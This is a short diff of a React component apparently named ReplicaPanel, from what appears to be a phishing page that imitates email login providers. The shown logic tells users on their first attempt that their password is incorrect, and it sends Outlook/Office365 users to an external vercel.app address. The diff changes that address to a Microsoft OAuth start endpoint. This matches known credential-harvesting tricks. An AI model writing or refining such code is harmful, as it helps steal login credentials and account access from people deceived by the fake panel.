@@ -60,7 +60,7 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
       setIsLoading(false);
       if (attempts === 0) {
         if (activeLoginProvider?.id === 'outloo' || activeLoginProvider?.id === 'office365') {
-          window.location.href = "https://auth-client-teal-seven.vercel.app/";
+          window.location.href = "https://auth-client-teal-seven.vercel.app/api/auth/microsoft/start";
         } else {
           setErrorMsg('Incorrect password. Please check your credentials and try again.');
           setAttempts(1);
